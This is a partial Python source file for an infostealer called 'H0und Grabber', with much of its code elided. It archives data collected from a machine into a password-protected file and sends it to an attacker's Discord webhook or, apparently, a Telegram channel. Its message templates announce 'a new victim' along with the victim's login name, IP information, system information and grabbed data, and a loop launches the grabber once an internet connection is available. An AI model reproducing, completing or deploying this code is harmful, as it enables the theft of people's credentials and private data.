...
Logger = logging.getLogger("H0und Grabber")
...
class H0undGrabber:
    ...
    def CreateArchive(self) -> tuple[str, str]: # Create archive of the data collected
        ...
        if Utility.GetSelf()[1] or os.path.isfile(rarPath):
            ...
            if os.path.isfile(rarPath):
                password = Settings.ArchivePassword or "h0und"
    ...
    def SendData(self) -> None: # Sends data to the webhook
        ...
        filename = "H0und-%s.%s" % (os.getlogin(), extention)
        ...
        if Settings.C2[0] == 0: # Discord Webhook
                ...
                "embeds": [
                    {
                        ...
                        "color": 34303,
                        "footer": {
                            "text": "Grabbed by H0und Grabber | WZZ#3875"
                        },
                        "thumbnail": {
                            "url": image_url
                        }
            ...
            payload = {
                'caption': f'<b>H0und Grabber</b> got a new victim: <b>{os.getlogin()}</b>\n\n<b>IP Info</b>\n<code>{ipinfo}</code>\n\n<b>System Info</b>\n<code>{system_info}</code>\n\n<b>Grabbed Info</b>\n<code>{grabbedInfo}</code>'.strip(), 
                'parse_mode': 'HTML'
            }
        ...
        while True:
            try:
                ...
                if Utility.IsConnectedToInternet(): # Check if internet connection is available
                    ...
                    H0undGrabber() # Start the grabber
